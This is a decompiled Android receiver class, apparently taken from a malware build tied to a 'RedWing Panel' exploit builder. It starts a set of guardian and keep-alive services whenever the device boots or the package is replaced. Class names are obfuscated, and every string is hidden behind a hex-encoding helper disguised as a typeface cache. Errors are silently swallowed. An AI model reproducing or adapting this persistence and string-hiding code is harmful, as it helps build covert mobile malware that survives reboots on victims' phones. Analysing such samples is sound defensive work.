package app.mobilex.plus.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import app.mobilex.plus.services.DataBVTask;
import app.mobilex.plus.services.GuardianService;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import app.mobilex.plus.workers.DataFPAdapter;
import app.mobilex.plus.workers.KeepAliveWorker;
import app.mobilex.plus.workers.UtilHALoader;
import v.s.Aqh0grSwgDbwr;
import v.s.OFMrQsTe5s1KYV0lq;
import v.s.SbxdZ6Kq2uhHQ5RPRqm;
import v.s.eoUwMTDTg3dRNUqWJq3;
import v.s.jb8et6SZeK5TWMrJFxDX;
import v.s.okc5AGRjqrud84oM6d;
import v.s.umMdYoePNXvWWPn;
import v.s.y6jRGLEWNMir;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class HandlerXNLoader extends BroadcastReceiver {
    public static final /* synthetic */ int dDIMxZXP1V8HdM = 0;

    static {
        TypefaceCache.obtain("000B00770055008300FC00BA00C0009F000D005A0054008600F400BA00C0");
    }

    private static /* synthetic */ void nlmae() {
    }

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        if (Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4("android.intent.action.BOOT_COMPLETED", TypefaceCache.obtain("00220078005F009500FF00B600D600E9002A0078004F008200FE00AB009C00A6002000620052008800FE00F100E30092000A0055007000A500DF009000E6009800130059006C00A200C2009000FC"), TypefaceCache.obtain("00200079005600C900F800AB00D100E9002A0078004F008200FE00AB009C00A6002000620052008800FE00F100E30092000A0055007000A500DF009000E6009800130059006C00A200C2009000FC"), "android.intent.action.LOCKED_BOOT_COMPLETED", "android.intent.action.MY_PACKAGE_REPLACED", TypefaceCache.obtain("00220078005F009500FF00B600D600E9002A0078004F008200FE00AB009C00A6002000620052008800FE00F100E200860000005D007A00A000D5008000E000820013005A007A00A400D5009B"), TypefaceCache.obtain("00220078005F009500FF00B600D600E9002A0078004F008200FE00AB009C00A6002000620052008800FE00F100E200860000005D007A00A000D5008000F3008300070053007F")).contains(intent.getAction())) {
            TypefaceCache.obtain("007E002B000600C700D2009000FD009300630044007E00A400D5009600E4008200110036006F00B500D9009800F5008200110053007F00C700AD00E2008F00E700020075004F008E00FF00B1008800E7");
            intent.getAction();
            BroadcastReceiver.PendingResult pendingResultGoAsync = goAsync();
            String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            y6jRGLEWNMir.Qrz92kRPw4GcghAc(context, TypefaceCache.obtain("00010059007400B300CF008C00E6008600110042"));
            try {
                String str2 = GuardianService.b1EoSIRjJHO5;
                okc5AGRjqrud84oM6d.Qrz92kRPw4GcghAc(context);
            } catch (Exception unused) {
            }
            try {
                String str3 = DataFPAdapter.xDyLpEZyrcKVe0;
                OFMrQsTe5s1KYV0lq.DVTNwpDEVsUKuznof(context);
            } catch (Exception e) {
                TypefaceCache.obtain("00070077004F008600D6008F00F300A300220066004F008200E200FF00C100A4002B0073005F009200FC00BA009200A10022007F0057008200F400E50092");
                e.getMessage();
            }
            try {
                String str4 = UtilHALoader.xDyLpEZyrcKVe0;
                SbxdZ6Kq2uhHQ5RPRqm.rCHnHJBAlOpNI5(context);
            } catch (Exception e2) {
                TypefaceCache.obtain("001600620052008B00D8009E00FE00A800220072005E009500B000AC00D100AF00260072004E008B00F500FF00D400A6002A007A005E008300AA00FF");
                e2.getMessage();
            }
            try {
                String str5 = KeepAliveWorker.xDyLpEZyrcKVe0;
                y6jRGLEWNMir.J0zjQ7CAgohuxU20eCW6(context);
            } catch (Exception e3) {
                TypefaceCache.obtain("00080073005E009700D100B300DB00B1002600410054009500FB00BA00C000E7003000750053008200F400AA00DE00A200630070005A008E00FC00BA00D600FD0063");
                e3.getMessage();
            }
            try {
                int i = DataBVTask.dDIMxZXP1V8HdM;
                y6jRGLEWNMir.nQilHWaqS401ZtR(context);
            } catch (Exception e4) {
                TypefaceCache.obtain("00070077004F008600D2008900E600A60030007D001B009400F300B700D700A30036007A005E00C700F600BE00DB00AB00260072000100C7");
                e4.getMessage();
            }
            y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.w9sT1Swbhx3hs), null, new eoUwMTDTg3dRNUqWJq3(context, intent, pendingResultGoAsync, null, 3), 3);
        }
    }
}
